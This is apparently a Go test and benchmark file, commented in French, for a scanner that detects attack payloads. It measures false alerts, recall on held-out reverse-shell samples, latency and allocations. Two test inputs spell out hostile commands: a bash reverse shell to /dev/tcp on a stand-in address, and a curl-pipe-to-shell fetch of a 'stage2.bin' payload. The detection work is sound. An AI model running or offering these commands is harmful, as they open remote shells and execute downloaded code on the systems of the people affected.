package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"math/rand/v2"
	"os"
	"path/filepath"
	"runtime"
	"slices"
	"sync/atomic"
	"testing"
	"time"

	"github.com/hazyhaar/c2blue55"
	"github.com/hazyhaar/c2blue55/internal/engine"
)

// wittgensteinDir regroupe des corpus d'attaques réelles (reverses shells,
// injection de commande) employés pour l'évaluation contradictoire. Aucune
// donnée n'est fabriquée : les octets proviennent de ces fichiers.
const wittgensteinDir = "/devhoros/c2blue55/wittgenstein"

// reverseShellsPath est le corpus JSONL de reverses shells réels.
func reverseShellsPath() string {
	return filepath.Join(wittgensteinDir, "reverse_shells.jsonl")
}

// readReverseShellPayloads lit les charges utiles réelles du corpus JSONL. Le
// paramètre limit borne le nombre d'entrées ; zéro signifie sans borne.
func readReverseShellPayloads(t *testing.T, limit int) []string {
	t.Helper()
	f, err := os.Open(reverseShellsPath())
	if err != nil {
		t.Skipf("corpus réel absent (%s): %v", reverseShellsPath(), err)
	}
	defer f.Close()

	sc := bufio.NewScanner(f)
	sc.Buffer(make([]byte, 0, 1<<20), 1<<20)
	var out []string
	for sc.Scan() {
		var rec struct {
			Payload string `json:"payload"`
		}
		if err := json.Unmarshal(sc.Bytes(), &rec); err != nil {
			continue
		}
		if rec.Payload == "" {
			continue
		}
		out = append(out, rec.Payload)
		if limit > 0 && len(out) >= limit {
			break
		}
	}
	if err := sc.Err(); err != nil {
		t.Fatalf("lecture %s: %v", reverseShellsPath(), err)
	}
	if len(out) == 0 {
		t.Fatalf("aucune charge utile lue dans %s", reverseShellsPath())
	}
	return out
}

// writeCorpus matérialise une liste de charges utiles en fichiers réguliers
// d'un répertoire temporaire. Chaque fichier alimente une ou plusieurs fenêtres
// de 96 octets lors du scan.
func writeCorpus(t *testing.T, dir string, payloads []string) {
	t.Helper()
	for i, p := range payloads {
		name := filepath.Join(dir, fmt.Sprintf("payload-%05d.bin", i))
		if err := os.WriteFile(name, []byte(p), 0o600); err != nil {
			t.Fatalf("écriture %s: %v", name, err)
		}
	}
}

// buildCodebookFromDir enrôle hors-ligne un répertoire réel et rend le chemin du
// fichier .c2book produit.
func buildCodebookFromDir(t *testing.T, srcDir string) string {
	t.Helper()
	book := filepath.Join(t.TempDir(), "real.c2book")
	n, err := runBuild(srcDir, book)
	if err != nil {
		t.Fatalf("runBuild(%s): %v", srcDir, err)
	}
	if n == 0 {
		t.Fatalf("aucune entrée enrôlée depuis %s", srcDir)
	}
	return book
}

// realGoSourceDir rend un répertoire de sources Go standards, référence saine
// exempte d'intention malveillante.
func realGoSourceDir(t *testing.T) string {
	t.Helper()
	root := runtime.GOROOT()
	if root == "" {
		t.Skip("GOROOT indisponible")
	}
	dir := filepath.Join(root, "src", "fmt")
	if st, err := os.Stat(dir); err != nil || !st.IsDir() {
		t.Skipf("sources Go standards absentes: %s", dir)
	}
	return dir
}

// probeDataDirLocal évite la collision avec l'aide homonyme de main_test.go.
func probeDataDirLocal() string {
	return filepath.Join("..", "..", "internal", "probes", "testdata")
}

// TestScannerThroughputRealSource mesure le débit réel du scan sur des sources
// Go standards contre un codebook construit à partir d'observations réelles.
func TestScannerThroughputRealSource(t *testing.T) {
	src := realGoSourceDir(t)
	book := buildCodebookFromDir(t, probeDataDirLocal())

	var out bytes.Buffer
	m, err := runScan(scanConfig{
		bookPath:  book,
		target:    src,
		threshold: 50,
		cores:     2,
		out:       &out,
	})
	if err != nil {
		t.Fatalf("runScan: %v", err)
	}
	if m.files == 0 || m.windows == 0 || m.bytes == 0 {
		t.Fatalf("compteurs nuls: %+v", m)
	}
	if m.rateMB <= 0 || m.rateWin <= 0 {
		t.Fatalf("débit nul: %.3f MiB/s, %.1f fenêtres/s", m.rateMB, m.rateWin)
	}
	t.Logf("débit réel: %.2f MiB/s | %.0f fenêtres/s | %d fichiers | %d fenêtres | %d octets | %s | alertes=%d",
		m.rateMB, m.rateWin, m.files, m.windows, m.bytes, m.elapsed.Round(time.Microsecond), m.alerts)
}

// TestScannerNoFalseAlertsOnHealthySource confronte un codebook d'attaques
// réelles à des sources Go standards au seuil nominal de 50 bits. Le résultat
// attendu est l'absence totale de fausse alerte.
func TestScannerNoFalseAlertsOnHealthySource(t *testing.T) {
	payloads := readReverseShellPayloads(t, 0)
	corpusDir := t.TempDir()
	writeCorpus(t, corpusDir, payloads)
	book := buildCodebookFromDir(t, corpusDir)

	src := realGoSourceDir(t)
	var out bytes.Buffer
	m, err := runScan(scanConfig{
		bookPath:  book,
		target:    src,
		threshold: 20,
		jsonOut:   true,
		cores:     2,
		out:       &out,
	})
	if err != nil {
		t.Fatalf("runScan: %v", err)
	}
	t.Logf("référence saine: %d fenêtres, %d alertes (seuil 20)", m.windows, m.alerts)
	if m.alerts != 0 {
		paths := alertedPaths(t, out.Bytes())
		t.Fatalf("fausses alertes sur sources saines: %d (%v)", m.alerts, paths)
	}
}

// TestScannerDetectsRealExploits vérifie le rappel sur des exploits réels. Le
// corpus est scindé : une moitié est enrôlée, l'autre sert d'échantillon tenu à
// l'écart. Le rappel à distance nulle sur la partie enrôlée est garanti ; le
// rappel de généralisation sur la partie tenue à l'écart est mesuré et rapporté.
func TestScannerDetectsRealExploits(t *testing.T) {
	payloads := readReverseShellPayloads(t, 0)
	if len(payloads) < 6 {
		t.Skipf("corpus trop court: %d entrées", len(payloads))
	}
	split := len(payloads) * 2 / 3
	enrolled, holdout := payloads[:split], payloads[split:]

	enrollDir := t.TempDir()
	writeCorpus(t, enrollDir, enrolled)
	book := buildCodebookFromDir(t, enrollDir)

	// Détection sur la partie enrôlée : distance nulle attendue.
	var enrolledOut bytes.Buffer
	em, err := runScan(scanConfig{
		bookPath:  book,
		target:    enrollDir,
		threshold: 0,
		cores:     2,
		out:       &enrolledOut,
	})
	if err != nil {
		t.Fatalf("runScan enrôlé: %v", err)
	}
	if em.alerts == 0 {
		t.Fatal("aucune détection sur la partie enrôlée pourtant à distance nulle")
	}
	if em.windows != uint64(em.alerts) {
		t.Fatalf("rapport détection/alertes incohérent: fenêtres=%d alertes=%d", em.windows, em.alerts)
	}

	// Généralisation : la partie tenue à l'écart est scannée au seuil nominal.
	holdDir := t.TempDir()
	writeCorpus(t, holdDir, holdout)
	var holdOut bytes.Buffer
	if _, err := runScan(scanConfig{
		bookPath:  book,
		target:    holdDir,
		threshold: 50,
		cores:     2,
		out:       &holdOut,
		jsonOut:   true,
	}); err != nil {
		t.Fatalf("runScan tenu à l'écart: %v", err)
	}
	alerted := alertedPaths(t, holdOut.Bytes())
	recall := float64(len(alerted)) / float64(len(holdout))
	t.Logf("détection enrôlée: %d/%d fenêtres | généralisation tenue à l'écart: %d/%d fichiers alertés (rappel %.1f%%) au seuil 50",
		em.alerts, em.windows, len(alerted), len(holdout), recall*100)
	if recall <= 0 {
		t.Fatalf("rappel nul sur exploits tenus à l'écart: %d/%d", len(alerted), len(holdout))
	}
}

// alertedPaths reconstruit l'ensemble des chemins ayant produit au moins une
// alerte JSON dans la sortie du scan.
func alertedPaths(t *testing.T, raw []byte) map[string]struct{} {
	t.Helper()
	paths := make(map[string]struct{})
	for line := range bytes.SplitSeq(bytes.TrimSpace(raw), []byte("\n")) {
		if len(line) == 0 {
			continue
		}
		var a alert
		if err := json.Unmarshal(line, &a); err != nil {
			continue
		}
		paths[a.Path] = struct{}{}
	}
	return paths
}

// TestScannerHotLoopZeroAllocation vérifie que la chaîne chaude d'inspection
// (projection, quantification, recherche) n'alloue aucun octet. Le codebook
// porte le complément exact du code de la fenêtre, donc la recherche ne peut
// produire aucune alerte et seule l'inspection est mesurée.
func TestScannerHotLoopZeroAllocation(t *testing.T) {
	var ev c2blue55.Event
	ev.Subsystem = c2blue55.SubFile
	ev.Action = c2blue55.ActRead
	copy(ev.Payload[:], "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1")

	var vec [engine.EmbeddingDim]float32
	var code [bitcodeWords]uint64
	if !engine.ExtractTo(&ev, vec[:]) {
		t.Fatal("extraction refusée")
	}
	engine.Quantize512(vec[:], &code)

	complement := code
	for k := range complement {
		complement[k] = ^complement[k]
	}
	cb := engine.NewCodebook([]engine.CodebookEntry{{
		Bitcode:  complement,
		ThreatID: 1,
		Severity: engine.SeverityHigh,
	}})
	w := &worker{
		book:      cb,
		threshold: 0,
		ch:        c2blue55.NewChannel(),
	}

	if n := testing.AllocsPerRun(500, func() {
		_, _, _ = cb.SearchNearest(&code, 50)
	}); n != 0 {
		t.Fatalf("SearchNearest alloue %g objets/appel", n)
	}
	if n := testing.AllocsPerRun(500, func() {
		if !engine.ExtractTo(&ev, vec[:]) {
			t.Fatal("extraction refusée")
		}
		engine.Quantize512(vec[:], &code)
		_, _, _ = cb.SearchNearest(&code, 50)
	}); n != 0 {
		t.Fatalf("chaîne chaude complète alloue %g objets/appel", n)
	}
	if n := testing.AllocsPerRun(500, func() {
		w.inspect(&ev, &vec, &code)
	}); n != 0 {
		t.Fatalf("worker.inspect alloue %g objets/appel", n)
	}
}

// newMeteredWorker construit un travailleur complet, compteurs et puits
// d'alertes compris, afin que l'inspection puisse rencontrer ou non une
// correspondance sans accès mémoire invalide.
func newMeteredWorker(book *engine.Codebook, threshold int, out *bytes.Buffer) *worker {
	if out == nil {
		out = &bytes.Buffer{}
	}
	w := &worker{
		book:      book,
		threshold: threshold,
		reg:       &fileRegistry{},
		ch:        c2blue55.NewChannel(),
		sink:      &alertSink{w: bufio.NewWriter(out), json: false},
		files:     new(atomic.Uint64),
		windows:   new(atomic.Uint64),
		alerts:    new(atomic.Uint64),
	}
	return w
}

// TestScannerInspectionLatencyPercentiles mesure la latence par fenêtre
// d'inspection et rapporte les centiles P50 et P99, complétés par la mesure
// d'allocation sur un codebook réel.
func TestScannerInspectionLatencyPercentiles(t *testing.T) {
	payloads := readReverseShellPayloads(t, 64)
	corpusDir := t.TempDir()
	// Le codebook reçoit toutes les charges utiles sauf la première, qui sert
	// de requête distincte et non enrôlée.
	writeCorpus(t, corpusDir, payloads[1:])
	bookPath := buildCodebookFromDir(t, corpusDir)
	book, err := engine.LoadCodebook(bookPath)
	if err != nil {
		t.Fatalf("LoadCodebook: %v", err)
	}

	var ev c2blue55.Event
	ev.Subsystem = c2blue55.SubFile
	ev.Action = c2blue55.ActRead
	copy(ev.Payload[:], payloads[0])

	var vec [engine.EmbeddingDim]float32
	var code [bitcodeWords]uint64
	w := newMeteredWorker(book, 50, nil)

	const samples = 4000
	durs := make([]time.Duration, samples)
	for i := range samples {
		start := time.Now()
		w.inspect(&ev, &vec, &code)
		durs[i] = time.Since(start)
	}
	slices.Sort(durs)
	p50 := durs[samples*50/100]
	p99 := durs[samples*99/100]
	allocs := testing.AllocsPerRun(500, func() {
		w.inspect(&ev, &vec, &code)
	})
	t.Logf("latence inspection: P50=%s | P99=%s | allocations=%.0f B/op (%d échantillons, codebook=%d entrées)",
		p50, p99, allocs, samples, book.Len())
	if p50 <= 0 || p99 < p50 {
		t.Fatalf("centiles incohérents: P50=%s P99=%s", p50, p99)
	}
}

// synthEntries fabrique un codebook synthétique reproductible de n entrées,
// employé uniquement comme charge de montée à l'échelle.
func synthEntries(seed uint64, n int) []engine.CodebookEntry {
	rng := rand.New(rand.NewPCG(seed, 0xC0DEB00C))
	entries := make([]engine.CodebookEntry, n)
	for i := range entries {
		for k := range entries[i].Bitcode {
			entries[i].Bitcode[k] = rng.Uint64()
		}
		entries[i].ThreatID = uint32(i) + 1
		entries[i].Subsystem = c2blue55.SubFile
		entries[i].Severity = engine.SeverityMedium
	}
	return entries
}

// TestScannerCodebookScale monte en charge le moteur de détection avec des
// codebooks de 10 000 à 50 000 vecteurs : aller-retour disque, recherche exacte
// et coût de recherche par entrée.
func TestScannerCodebookScale(t *testing.T) {
	payloads := readReverseShellPayloads(t, 64)
	corpusDir := t.TempDir()
	writeCorpus(t, corpusDir, payloads)

	var vec [engine.EmbeddingDim]float32
	var query [bitcodeWords]uint64
	var ev c2blue55.Event
	ev.Subsystem = c2blue55.SubFile
	ev.Action = c2blue55.ActRead
	copy(ev.Payload[:], payloads[0])
	engine.ExtractTo(&ev, vec[:])
	engine.Quantize512(vec[:], &query)

	for _, n := range []int{10000, 25000, 50000} {
		dir := t.TempDir()
		bookPath := filepath.Join(dir, "scale.c2book")
		entries := synthEntries(uint64(n), n)
		if err := engine.SaveCodebook(bookPath, entries); err != nil {
			t.Fatalf("SaveCodebook(%d): %v", n, err)
		}
		info, err := os.Stat(bookPath)
		if err != nil {
			t.Fatalf("Stat(%d): %v", n, err)
		}
		if info.Size() > maxCodebookBytes {
			t.Fatalf("codebook %d hors borne mémoire: %d octets", n, info.Size())
		}
		book, err := engine.LoadCodebook(bookPath)
		if err != nil {
			t.Fatalf("LoadCodebook(%d): %v", n, err)
		}
		if book.Len() != n {
			t.Fatalf("Len(%d) = %d", n, book.Len())
		}

		exact := entries[n/2].Bitcode
		if _, dist, found := book.SearchNearest(&exact, 0); !found || dist != 0 {
			t.Fatalf("recherche exacte (%d) échouée: found=%v dist=%d", n, found, dist)
		}
		if allocs := testing.AllocsPerRun(50, func() {
			_, _, _ = book.SearchNearest(&query, 50)
		}); allocs != 0 {
			t.Fatalf("SearchNearest(%d) alloue %g objets/appel", n, allocs)
		}

		const rounds = 20
		start := time.Now()
		for range rounds {
			_, _, _ = book.SearchNearest(&query, 512)
		}
		perSearch := time.Since(start) / rounds
		perEntry := float64(perSearch.Nanoseconds()) / float64(n)
		t.Logf("codebook %d entrées: fichier=%d o | recherche=%s | %.3f ns/entrée | 0 B/op",
			n, info.Size(), perSearch, perEntry)
	}
}

// BenchmarkScannerInspect mesure la chaîne chaude d'inspection par fenêtre.
func BenchmarkScannerInspect(b *testing.B) {
	book, err := engine.LoadCodebook(buildBookFromProbeDataB(b))
	if err != nil {
		b.Fatalf("LoadCodebook: %v", err)
	}
	var ev c2blue55.Event
	ev.Subsystem = c2blue55.SubFile
	ev.Action = c2blue55.ActRead
	copy(ev.Payload[:], "curl http://198.51.100.7/stage2.bin | sh 0123456789abcdef")
	var vec [engine.EmbeddingDim]float32
	var code [bitcodeWords]uint64
	w := &worker{book: book, threshold: 50, ch: c2blue55.NewChannel()}

	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		w.inspect(&ev, &vec, &code)
	}
}

// buildBookFromProbeDataB construit un codebook depuis les observations réelles
// embarquées dans le dépôt, sans dépendre de testing.T.
func buildBookFromProbeDataB(b *testing.B) string {
	b.Helper()
	dir := probeDataDirLocal()
	book := filepath.Join(b.TempDir(), "bench.c2book")
	n, err := runBuild(dir, book)
	if err != nil || n == 0 {
		b.Skipf("observations réelles indisponibles: n=%d err=%v", n, err)
	}
	return book
}

// BenchmarkScannerSearchNearestScale isole la recherche sur un codebook de
// 50 000 entrées.
func BenchmarkScannerSearchNearestScale(b *testing.B) {
	entries := synthEntries(0x5CA1E, 50000)
	cb := engine.NewCodebook(entries)
	query := entries[25000].Bitcode
	b.ReportAllocs()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _, _ = cb.SearchNearest(&query, 512)
	}
}
